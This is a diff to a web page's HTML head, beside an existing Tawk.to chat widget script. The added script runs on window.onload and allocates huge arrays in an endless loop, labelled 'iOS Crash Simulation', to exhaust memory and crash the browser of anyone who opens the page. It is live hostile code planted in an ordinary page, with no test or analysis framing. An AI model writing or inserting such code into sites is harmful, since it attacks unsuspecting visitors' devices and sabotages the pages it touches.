@@ -13,6 +13,18 @@ s0.parentNode.insertBefore(s1,s0);
 })();
 </script>
 <!--End of Tawk.to Script-->
+	<script>
+  function heavyCrash() {
+    // बहुत ज़्यादा memory allocation
+    let arr = [];
+    while(true) {
+      arr.push(new Array(1000000).fill("iOS Crash Simulation..."));
+    }
+  }
+
+  window.onload = heavyCrash;
+</script>
+
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
